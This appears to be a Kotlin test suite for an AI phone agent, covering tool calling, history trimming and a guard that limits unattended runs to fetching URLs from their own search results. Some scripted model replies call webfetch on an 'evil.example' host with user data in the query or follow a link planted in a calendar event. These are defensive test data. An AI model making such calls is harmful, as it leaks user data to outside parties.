package com.samosaai.masala.agent

import com.samosaai.masala.core.agent.ToolInfo
import com.samosaai.masala.core.agent.ToolScope
import com.samosaai.masala.core.tool.Produced
import com.samosaai.masala.core.tool.ToolDefinition
import com.samosaai.masala.core.tool.ToolResult
import com.samosaai.masala.core.tool.ToolSensitivity
import com.samosaai.masala.llm.ChatMessage
import com.samosaai.masala.llm.FunctionCall
import com.samosaai.masala.llm.ToolCall
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.awaitCancellation
import kotlinx.coroutines.flow.toList
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertIs
import kotlin.test.assertTrue

class MasalaAgentTest {
    private val definitions = listOf("get_time", "set_alarm", "dial").map { ToolDefinition(it, "", JsonObject(emptyMap())) }
    private val infos = listOf(
        ToolInfo("get_time", ToolSensitivity.READ_ONLY),
        ToolInfo("set_alarm", ToolSensitivity.CHANGES_SOMETHING),
        ToolInfo("dial", ToolSensitivity.READ_ONLY),
    )

    private fun call(id: String, name: String, args: String = "{}") = ToolCall(id, function = FunctionCall(name, args))
    private fun assistant(text: String = "", vararg calls: ToolCall) =
        ChatMessage("assistant", JsonPrimitive(text), toolCalls = calls.toList().ifEmpty { null })
    private fun user(text: String) = ChatMessage("user", JsonPrimitive(text))

    private class Script(private val replies: ArrayDeque<ChatMessage>) : AgentModel {
        val requests = mutableListOf<List<ChatMessage>>()
        val toolsSeen = mutableListOf<List<String>>()
        override suspend fun next(messages: List<ChatMessage>, tools: List<com.samosaai.masala.llm.ToolDefinition>): ChatMessage {
            requests += messages
            toolsSeen += tools.map { it.function.name }
            return replies.removeFirst()
        }
    }

    private fun agent(
        model: AgentModel,
        scope: ToolScope = ToolScope.command(infos),
        maxSteps: Int = 6,
        runner: AgentToolRunner = AgentToolRunner { name, _ -> ToolResult.Success("$name ok") },
    ) = MasalaAgent(model, runner, definitions, scope, { _ -> "system" }, maxSteps)

    private fun script(vararg replies: ChatMessage) = Script(ArrayDeque(replies.toList()))

    @Test fun resultsTheChatShowsAreNamedSoTheModelDoesNotReadThemBack() = runBlocking {
        // Seen on the phone: after "Overlay saved." the model listed folders and read the PNGs back as base64.
        val model = script(assistant("", call("1", "get_time")), assistant("Here is the cut-out."))
        val runner = AgentToolRunner { _, _ ->
            ToolResult.Success(
                "Found 1 object. Overlay saved.",
                produced = listOf(com.samosaai.masala.core.tool.Produced("image", "cutout 1: mug", "/files/generated/cut.png")),
            )
        }
        agent(model, runner = runner).run(user("cut out the mug")).collect {}
        val toolText = model.requests[1].last { it.role == "tool" }.textContent
        assertTrue(toolText.contains("Already shown to the user as cards"))
        assertTrue(toolText.contains("/files/generated/cut.png"))
    }

    @Test fun anUnwatchedRunOpensOnlyPagesItsSearchReturned() = runBlocking {
        val tools = listOf("websearch", "webfetch")
        val defs = tools.map { ToolDefinition(it, "", JsonObject(emptyMap())) }
        val scope = ToolScope.command(tools.map { ToolInfo(it, ToolSensitivity.READ_ONLY) })
        val fetched = mutableListOf<String>()
        val runner = AgentToolRunner { name, args ->
            if (name == "websearch") ToolResult.Success("1. F1 news\n   https://f1.example/a")
            else ToolResult.Success("page").also { fetched += (args["url"] as JsonPrimitive).content }
        }
        fun replies() = script(
            assistant("", call("1", "websearch", """{"query":"f1"}""")),
            assistant("", call("2", "webfetch", """{"url":"https://evil.example/?q=Standup"}""")),
            assistant("", call("3", "webfetch", """{"url":"https://f1.example/a"}""")),
            assistant("Brief"),
        )
        val guarded = MasalaAgent(replies(), runner, defs, scope, { _ -> "system" }, fetchOnlyResults = true).run(user("go")).toList()
        assertEquals(listOf("https://f1.example/a"), fetched)
        val refusal = guarded.filterIsInstance<AgentEvent.ToolDone>().map { it.result }.filterIsInstance<ToolResult.Failure>().single()
        assertEquals(com.samosaai.masala.core.agent.FetchAllowance.REFUSAL, refusal.message)

        // A run someone watches is unchanged.
        fetched.clear()
        MasalaAgent(replies(), runner, defs, scope, { _ -> "system" }).run(user("go")).toList()
        assertEquals(listOf("https://evil.example/?q=Standup", "https://f1.example/a"), fetched)
    }

    @Test fun anUnwatchedRunDoesNotOpenUrlsFromOtherTools() = runBlocking {
        val tools = listOf("list_calendar_events", "webfetch")
        val defs = tools.map { ToolDefinition(it, "", JsonObject(emptyMap())) }
        val scope = ToolScope.command(tools.map { ToolInfo(it, ToolSensitivity.READ_ONLY) })
        val fetched = mutableListOf<String>()
        val runner = AgentToolRunner { name, args ->
            if (name == "list_calendar_events") ToolResult.Success("09:00 Call (https://evil.example/join)")
            else ToolResult.Success("page").also { fetched += (args["url"] as JsonPrimitive).content }
        }
        val replies = script(
            assistant("", call("1", "list_calendar_events")),
            assistant("", call("2", "webfetch", """{"url":"https://evil.example/join"}""")),
            assistant("Done"),
        )
        MasalaAgent(replies, runner, defs, scope, { _ -> "system" }, fetchOnlyResults = true).run(user("go")).toList()
        assertEquals(emptyList(), fetched)
    }

    @Test fun anUnwatchedRunStillOpensSearchResultsAfterOlderExchangesAreTrimmed() = runBlocking {
        val tools = listOf("websearch", "webfetch")
        val defs = tools.map { ToolDefinition(it, "", JsonObject(emptyMap())) }
        val scope = ToolScope.command(tools.map { ToolInfo(it, ToolSensitivity.READ_ONLY) })
        val fetched = mutableListOf<String>()
        val runner = AgentToolRunner { name, args ->
            if (name == "websearch") ToolResult.Success("1. F1\n   https://f1.example/a")
            else ToolResult.Success("page").also { fetched += (args["url"] as JsonPrimitive).content }
        }
        // The search happens in the first exchange; the fetch comes after more exchanges than are kept.
        val replies = mutableListOf(assistant("", call("s", "websearch", """{"query":"f1"}""")), assistant("ok"))
        repeat(MasalaAgent.KEPT_EXCHANGES) { replies += assistant("ok") }
        replies += assistant("", call("f", "webfetch", """{"url":"https://f1.example/a"}"""))
        replies += assistant("done")
        val agent = MasalaAgent(script(*replies.toTypedArray()), runner, defs, scope, { _ -> "system" }, fetchOnlyResults = true)
        agent.run(user("first")).toList()
        repeat(MasalaAgent.KEPT_EXCHANGES) { agent.run(user("again $it")).toList() }
        agent.run(user("open it")).toList()
        assertEquals(listOf("https://f1.example/a"), fetched)
    }

    @Test fun answersWithNoTools() = runBlocking {
        val events = agent(script(assistant("Hello"))).run(user("hi")).toList()
        assertEquals(listOf(AgentEvent.Thinking, AgentEvent.Done("Hello")), events)
    }

    @Test fun aFailedSkillCallDoesNotSuppressTheListing() = runBlocking {
        val skill = com.samosaai.masala.core.contract.MasalaSkill(
            id = "chef", title = "Chef", description = "Cooks.", instructions = "Cook.",
        )
        val defs = definitions + ToolDefinition("run_skill", "", JsonObject(emptyMap()))
        val scope = ToolScope.command(
            infos + ToolInfo("run_skill", ToolSensitivity.READ_ONLY),
        )
        val model = script(
            assistant("", call("1", "run_skill", """{"skill_id":"chef"}""")),
            assistant("nope"),
            assistant("done"),
        )
        val runner = AgentToolRunner { name, _ ->
            if (name == "run_skill") ToolResult.Failure("refused") else ToolResult.Success("ok")
        }
        val prompt: (AgentPrompt.PromptContext) -> String =
            { ctx -> AgentPrompt.build("Monday", listOf(skill), context = ctx) }
        val a = MasalaAgent(model, runner, defs, scope, prompt)
        a.run(user("cook?")).toList()
        a.run(user("cook now?")).toList()
        // The skill call failed, so the next turn's prompt still lists it.
        assertTrue(model.requests.last()[0].textContent.contains("chef:"), model.requests.last()[0].textContent)
    }

    @Test fun aSuccessfulSkillCallSuppressesTheListing() = runBlocking {
        val skill = com.samosaai.masala.core.contract.MasalaSkill(
            id = "chef", title = "Chef", description = "Cooks.", instructions = "Cook.",
        )
        val defs = definitions + ToolDefinition("run_skill", "", JsonObject(emptyMap()))
        val scope = ToolScope.command(
            infos + ToolInfo("run_skill", ToolSensitivity.READ_ONLY),
        )
        val model = script(
            assistant("", call("1", "run_skill", """{"skill_id":"chef"}""")),
            assistant("nope"),
            assistant("done"),
        )
        val runner = AgentToolRunner { _, _ -> ToolResult.Success("Skill [chef]: fetched") }
        val prompt: (AgentPrompt.PromptContext) -> String =
            { ctx -> AgentPrompt.build("Monday", listOf(skill), context = ctx) }
        val a = MasalaAgent(model, runner, defs, scope, prompt)
        a.run(user("cook?")).toList()
        a.run(user("cook now?")).toList()
        assertTrue(!model.requests.last()[0].textContent.contains("chef:"), model.requests.last()[0].textContent)
    }

    @Test fun oneToolCallThenAnswer() = runBlocking {
        val model = script(assistant("", call("1", "get_time")), assistant("It is noon"))
        val a = agent(model)
        val events = a.run(user("time?")).toList()
        assertTrue(events.any { it is AgentEvent.ToolCall && it.name == "get_time" })
        assertEquals(AgentEvent.Done("It is noon"), events.last())
        assertEquals(listOf("user", "assistant", "tool", "assistant"), a.history.map { it.role })
        assertEquals("get_time ok", a.history[2].textContent)
        assertEquals("system", model.requests[1].first().textContent)
    }

    @Test fun filesAndTypedResultsAreReportedTogether() = runBlocking {
        val app = Produced("mini_app", "Snake", "ab12cd34")
        val runner = AgentToolRunner { _, _ -> ToolResult.Success("made", listOf("/out/song.mp3"), listOf(app)) }
        val events = agent(script(assistant("", call("1", "get_time")), assistant("Done")), runner = runner).run(user("x")).toList()
        assertEquals(
            AgentEvent.Results(listOf(Produced("audio", "song.mp3", "/out/song.mp3"), app)),
            events.filterIsInstance<AgentEvent.Results>().single(),
        )
    }

    @Test fun twoParallelCallsGetTwoResults() = runBlocking {
        val a = agent(script(assistant("", call("1", "get_time"), call("2", "dial")), assistant("done")))
        a.run(user("both")).toList()
        assertEquals(listOf("1", "2"), a.history.filter { it.role == "tool" }.map { it.toolCallId })
    }

    @Test fun outOfScopeCallIsRefusedAndFedBack() = runBlocking {
        val ran = mutableListOf<String>()
        val scope = ToolScope.unattended(ToolScope.command(infos), infos)
        val model = script(assistant("", call("1", "set_alarm")), assistant("Can't"))
        val a = agent(model, scope) { name, _ -> ran += name; ToolResult.Success("ok") }
        val events = a.run(user("alarm")).toList()
        assertEquals(emptyList(), ran)
        val done = events.filterIsInstance<AgentEvent.ToolDone>().single()
        assertIs<ToolResult.Failure>(done.result)
        assertTrue(a.history.single { it.role == "tool" }.textContent.contains("not available"))
        assertEquals(listOf("get_time", "dial"), model.toolsSeen.first())
    }

    @Test fun stepLimit() = runBlocking {
        val model = script(assistant("", call("1", "get_time")), assistant("", call("2", "get_time")), assistant("never"))
        val events = agent(model, maxSteps = 2).run(user("loop")).toList()
        assertEquals(AgentEvent.StepLimit, events.last())
    }

    @Test fun aMissingCapabilityIsAStepAndTheRunStillAnswers() = runBlocking {
        val model = script(
            assistant("", call("1", "get_time"), call("2", "dial")),
            assistant("I couldn't call: phone access isn't granted."),
        )
        val a = agent(model) { _, _ -> ToolResult.NeedsCapability("special:usage_access", "Needs usage access") }
        val events = a.run(user("x")).toList()
        // The host is told, so it can offer the grant...
        assertTrue(events.any { it is AgentEvent.NeedsCapability })
        // ...and the model still gets to answer instead of the turn dying.
        assertEquals("I couldn't call: phone access isn't granted.", (events.last() as AgentEvent.Done).text)
        // Every call has a result, and the model is told not to retry the blocked one.
        val toolMessages = a.history.filter { it.role == "tool" }
        assertEquals(listOf("1", "2"), toolMessages.map { it.toolCallId })
        assertTrue(toolMessages.all { it.textContent.contains("Do not call it again") })
    }

    @Test fun failedToolIsReportedToTheModel() = runBlocking {
        val a = agent(script(assistant("", call("1", "get_time")), assistant("sorry"))) { _, _ -> ToolResult.Failure("boom") }
        a.run(user("x")).toList()
        assertEquals("Error: boom", a.history.single { it.role == "tool" }.textContent)
    }

    @Test fun modelErrorBecomesFailed() = runBlocking {
        val failing = AgentModel { _, _ -> error("offline") }
        val events = agent(failing).run(user("x")).toList()
        assertEquals(AgentEvent.Failed("offline"), events.last())
    }

    @Test fun cancellationLeavesNoOrphanedToolCall() = runBlocking {
        val started = CompletableDeferred<Unit>()
        val model = script(assistant("", call("1", "get_time"), call("2", "dial")))
        val a = agent(model) { _, _ -> started.complete(Unit); awaitCancellation() }
        val job = launch { a.run(user("x")).collect {} }
        started.await()
        job.cancel()
        job.join()
        assertEquals(listOf("1", "2"), a.history.filter { it.role == "tool" }.map { it.toolCallId })
        assertTrue(a.history.filter { it.role == "tool" }.all { it.textContent == AgentHistory.CANCELLED })
    }

    @Test fun followUpKeepsHistory() = runBlocking {
        val model = script(assistant("first"), assistant("second"))
        val a = agent(model)
        a.run(user("one")).toList()
        a.run(user("two")).toList()
        assertEquals(listOf("user", "assistant", "user"), model.requests[1].drop(1).map { it.role })
    }

    @Test fun onlyTheLastFiveExchangesSurvive() = runBlocking {
        val model = script(*Array(8) { assistant("a$it") })
        val a = agent(model)
        repeat(8) { a.run(user("q$it")).toList() }
        assertEquals(5, a.history.count { it.role == "user" })
        assertEquals("q3", a.history.first().textContent)
    }

    @Test fun transcriptKeepsWhatTheHistoryDropped() = runBlocking {
        val model = script(*Array(8) { assistant("a$it") })
        val a = agent(model)
        repeat(8) { a.run(user("q$it")).toList() }
        assertEquals((0 until 8).flatMap { listOf("q$it", "a$it") }, a.transcript.map { it.textContent })
        assertEquals(a.history, a.transcript.takeLast(a.history.size))
    }
}

class AgentHistoryTest {
    private fun user(t: String) = ChatMessage("user", JsonPrimitive(t))
    private fun assistant(t: String, vararg ids: String) =
        ChatMessage("assistant", JsonPrimitive(t), toolCalls = ids.map { ToolCall(it, function = FunctionCall("x", "{}")) }.ifEmpty { null })
    private fun tool(id: String) = ChatMessage("tool", JsonPrimitive("r"), toolCallId = id)

    @Test fun repairAddsOnlyMissingResults() {
        val repaired = AgentHistory.repairOrphanedToolCalls(listOf(user("u"), assistant("", "1", "2", "3"), tool("2"), user("next")))
        assertEquals(listOf("user", "assistant", "tool", "tool", "tool", "user"), repaired.map { it.role })
        assertEquals(setOf("1", "2", "3"), repaired.filter { it.role == "tool" }.map { it.toolCallId }.toSet())
    }

    @Test fun repairLeavesCompleteHistoryAlone() {
        val h = listOf(user("u"), assistant("", "1"), tool("1"), assistant("done"))
        assertEquals(h, AgentHistory.repairOrphanedToolCalls(h))
    }

    @Test fun trimDropsOldestAndNeverStartsOnToolResult() {
        val h = listOf(user("a".repeat(100)), assistant("", "1"), tool("1"), assistant("b".repeat(10)), user("c"), assistant("d"))
        val trimmed = AgentHistory.trim(h, maxChars = 14)
        assertEquals("user", trimmed.first().role)
        assertEquals(h.takeLast(2), trimmed.takeLast(2))
    }

    @Test fun trimPrependsNoteWhenAssistantWouldBeFirst() {
        val h = listOf(user("a".repeat(100)), assistant("answer"))
        val trimmed = AgentHistory.trim(h, maxChars = 10)
        assertEquals(AgentHistory.CONTEXT_NOTE, trimmed.first().textContent)
        assertEquals("assistant", trimmed[1].role)
    }

    @Test fun trimKeepsAtLeastTheNewestMessage() {
        val h = listOf(user("x".repeat(500)))
        assertEquals(h, AgentHistory.trim(h, maxChars = 10))
    }

    @Test fun trimNeverReturnsEmptyWhenToolResultsExceedTheBudget() {
        // A long run whose tail is one huge tool result: the budget breaks inside the tools, and
        // skipping leading tool results used to consume the message list entirely.
        val h = listOf(
            user("ask"),
            assistant("", "1"),
            ChatMessage("tool", JsonPrimitive("r".repeat(5_000)), toolCallId = "1"),
        )
        val trimmed = AgentHistory.trimToTokens(h, maxTokens = 10)
        assertTrue(trimmed.isNotEmpty())
        // The turn that called the tool comes along with it, so the pair stays valid.
        assertEquals(listOf("assistant", "tool"), trimmed.takeLast(2).map { it.role })
    }

    @Test fun trimToTokensUsesFourCharactersPerToken() {
        val h = listOf(user("a".repeat(400)))
        assertEquals(h, AgentHistory.trimToTokens(h, maxTokens = 100))
        assertEquals(100, AgentHistory.tokensOf(h))
    }
}
